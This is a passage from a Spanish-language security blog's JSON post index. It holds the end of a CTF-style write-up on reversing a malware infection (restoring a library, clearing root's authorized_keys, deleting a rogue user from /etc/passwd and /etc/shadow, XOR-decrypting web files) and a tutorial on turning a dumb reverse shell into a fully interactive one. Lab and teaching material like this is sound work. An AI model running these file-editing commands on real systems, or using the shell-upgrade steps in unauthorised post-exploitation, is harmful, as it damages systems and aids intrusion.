por el malware debemos restaurar el archivo oldliblogging.so, para esto ejecutamos la siguiente linea de comandos:mv /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.soFlag 3Como vimos durante el analisis se agregó una llave ssh al archivo authorized_keys del usuario root, por lo cual, nuestra tarea será eliminar dicha llave con la siguiente linea de comandos:echo &#39;&#39; &amp;gt; /root/.ssh/authorized_keysFlag 4Para obtener esta bandera necesitamos eliminar el usuario security eliminandolo de los archivos /etc/passwd y /etc/shadow manualmente ya que en la máquina no existe la utilidad userdel, par eliminarlo de el primer archivo usaremos la siguiente línea de comandos:sed -i &#39;$d&#39; /etc/passwdY para eliminarlo del archivo shadow:sed -i &#39;$d&#39; /etc/shadowFlag 5Durante el analisis realizado con strings pudimos apreciar la creación del directorio oculto /opt/.fixutil/ el cual solo tiene permisos para el usuario propietario(root) y ya que tenemos nuestra reverse shell con privilegios elevados, podemos revisar el contenido de este directorio donde nos encontramos con el archvio backup.txt el cual continene la contraseña con la que se cifraron los archivos:Mirando en las cadenas obetnidas con string encontramos el directorio web /usr/local/apache2/htdocs/ y al hacer un cat para revisar el contenido de los archivos, podemos ver que están cifrados:Al tratarse de un cifrado XOR podemos implementar un programa en python para que descrifre los archivos con la llave que está en el archivo backup.txt, hay que recordar que la máquina no tiene python por lo que este proceso se hará local.from pathlib import Pathllave=b&quot;AdsipPewFlfkmll&quot;archivos=[&quot;index.html&quot;,&quot;todo.html&quot;,&quot;reallyimportant.txt&quot;]carpeta_salida=Path(&quot;descifrados&quot;)Path.mkdir(carpeta_salida)for elemento in archivos: archivo=open(elemento,&quot;rb&quot;) archivo_salida=Path(&quot;descifrados&quot;, elemento) salida=open(archivo_salida,&quot;wb&quot;) contenido=archivo.read() for i in range(0,len(contenido)): arr=bytes(chr(contenido[i]^llave[i%len(llave)]), &#39;utf-8&#39;) salida.write(arr)Una vez que hemos descifrado todos los archivos, crearemos la carpeta descifrados en el directorio home de alex y copiaremos los archivos con la herramienta scp de la siguiente manera:scp descifrados/* alex@10.10.72.227:descifradosA continuación, copiamos los archivos al directorio /usr/local/apache2/htdocs/ con la shell de root y así obtendríamos la flag 5.cp /home/alex/descifrados/* .ConclusionesCon esto terminamos de revertir todos los cambios hechos por el malware y ayudamos a alex a recuperar los archivos que fueron cifrados, espero que les haya gustado y que les haya sido útil, nos vemos hasta otro post y recuerden revisar bien sus correos para no ser victimas de Phishing o Spear Phishing como nuestro amigo Alex ;)" }, { "title": "Como obtener una shell interactiva a partir de una dumbshell", "url": "/posts/Shell-interactiva/", "categories": "Tutorial, DIY", "tags": "bash, reverse shell, dumb shell, full interactive shell, python", "date": "2021-03-16 12:00:00 -0600", "snippet": "IntroducciónGeneralmente cuando obtenemos acceso a través de una conexión inversa o Reverse Shell nos encontramos con el problema que no podemos usar el autocompletado de la consola, a veces el contenido se muestra con dimensiones incorrectas o se visualiza con identados extraños, sin embargo, en este post veremos como obtener una Full Interactive shell a partir de una Dumb Shell en unos sencillos pasos.ProcedimientoEn mi canal de youtube tengo un vídeo explicando el procedimiento, les dejo aquí el enlace si les gusta más el formato vídeo ;) Obtener interactive shellPartiremos este tutorial tomando en cuenta que en nuestro netcat ya hemos recibido una conexión, explicaremos como obtener nuestra Full Interactive Shell con bash y con Python.BashPara realizarlo con bash escribimos la siguiente línea de comandos:script -q /dev/null -c bashPythonPara python utilizaremos la siguiente línea de comandos:python3 -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;Procedimiento (Continuación)Con cualquiera de los dos métodos veremos el prompt de bash después de dar enter:Ahora enviaremos este proceso al background o segundo plano con la combinacion de teclas Ctrl+Z y después escribiremos la siguiente línea de comandos:stty raw -echo; fgEstas instrucciones le dicen a bash que imprima nuestra shell actual en modo raw y enseguida le indicamos que regrese al foreground (fg) la tarea enviada al background. Despues de dar enter veremos un mensaje donde escribiremos reset (puede que no se vea que estemos escribiendo), finalmente nos preguntara el tipo de terminal y aquí escribiremos xterm:Después de dar enter se limpiará la pantalla y tendremos de nueva el prompt de bash, ahora debemos importar dos variables SHELL y TERM de la siguiente manera:export SHELL=bashexport TERM=xtermEn este punto nuestra shell debe permitirnos recorrer el historial (flechas arriba y abajo), limpiar la pantalla (Ctrl+L), cancelar un proceso (Ctrl+C), etc. pero puede que el contenido no se muestren correctamente, para corregir esto abriremos una shell en nuestro equipo y vamos a ejecutar lo siguiente:stty sizeObtendremos las filas (primer número) y las columnas (segundo número) que tiene una shell en nuestro equipo, ahora esos valores los copiaremos a la reverse shell para que se muestre correctamente:stty rows 41 columns 172ConclusionesCon estos sencillos pasos debemos tener configurada nuestra full interactive shell que nos permitirá explorar la máquina objetivo con más comodidad para las tareas de post-explotación, sin embargo, no siempre funciona debido al tipo de conexiones inversas que obtenemos. Espero que este post les haya gustado y que les haya sido útil, nos vemos en otro tutorial o en otra publicación." } ]
